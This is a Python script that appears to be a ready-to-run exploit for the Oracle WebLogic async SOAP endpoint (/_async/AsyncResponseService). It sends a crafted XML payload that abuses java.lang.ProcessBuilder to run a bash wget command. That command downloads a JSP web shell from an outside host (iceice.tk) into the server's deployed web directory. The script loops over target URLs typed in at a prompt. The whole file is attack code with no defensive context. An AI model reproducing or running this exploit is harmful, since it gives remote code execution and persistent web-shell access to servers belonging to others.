# coding:utf-8
import time
import socket
import sys
import threading
import ssl


def doRequest(url):
    ip_form = url.replace("http://","").replace(":"," ").replace("/","").split()
    ip = ip_form[0]
    port = ip_form[1]
    response = bytes()
    sock = socket.socket()
    sock.connect((ip, int(port)))
    sock.send("POST /_async/AsyncResponseService HTTP/1.1\r\n".encode("utf-8"))
    sock.send("Host: %s:%s\r\n".encode("utf-8") % (ip.encode(), port.encode()))
    sock.send("Content-Length: 858\r\n".encode("utf-8"))
    sock.send("Accept-Encoding: gzip, deflate\r\n".encode("utf-8"))
    sock.send("SOAPAction:\r\n".encode("utf-8"))
    sock.send("Accept: */*\r\n".encode("utf-8"))
    sock.send("User-Agent: Apache-HttpClient/4.1.1 (java 1.5)\r\n".encode("utf-8"))
    sock.send("Connection: keep-alive\r\n".encode("utf-8"))
    sock.send("content-type: text/xml\r\n".encode("utf-8"))
    sock.send("\r\n".encode("utf-8"))
    sock.send("<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\r\n".encode("utf-8"))
    sock.send("xmlns:wsa=\"http://www.w3.org/2005/08/addressing\"\r\n".encode("utf-8"))
    sock.send("xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">\r\n".encode("utf-8"))
    sock.send("<soapenv:Header>\r\n".encode("utf-8"))
    sock.send("<wsa:Action>xx</wsa:Action>\r\n".encode("utf-8"))
    sock.send("<wsa:RelatesTo>xx</wsa:RelatesTo>\r\n".encode("utf-8"))
    sock.send("<work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\r\n".encode("utf-8"))
    sock.send("<void class=\"java.lang.ProcessBuilder\">\r\n".encode("utf-8"))
    sock.send("<array class=\"java.lang.String\" length=\"3\">\r\n".encode("utf-8"))
    sock.send("<void index=\"0\">\r\n".encode("utf-8"))
    sock.send("<string>/bin/bash</string>\r\n".encode("utf-8"))
    sock.send("</void>\r\n".encode("utf-8"))
    sock.send("<void index=\"1\">\r\n".encode("utf-8"))
    sock.send("<string>-c</string>\r\n".encode("utf-8"))
    sock.send("</void>\r\n".encode("utf-8"))
    sock.send("<void index=\"2\">\r\n".encode("utf-8"))
    sock.send("<string>wget http://iceice.tk/server/shell.jsp -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp</string>\r\n".encode("utf-8"))
    sock.send("</void>\r\n".encode("utf-8"))
    sock.send("</array>\r\n".encode("utf-8"))
    sock.send("<void method=\"start\"/></void>\r\n".encode("utf-8"))
    sock.send("</work:WorkContext>\r\n".encode("utf-8"))
    sock.send("</soapenv:Header>\r\n".encode("utf-8"))
    sock.send("<soapenv:Body>\r\n".encode("utf-8"))
    sock.send("<asy:onAsyncDelivery/>\r\n".encode("utf-8"))
    sock.send("</soapenv:Body></soapenv:Envelope>\r\n\r\n".encode("utf-8"))




    # response = sock.recv(1024)
    while True:
        buf = sock.recv(4096)
        response += buf
        if not len(buf):
            break
    print(response)
    return response


# def main():
if __name__ == "__main__":
    while True:
        url = input("input url:")
        doRequest(url)

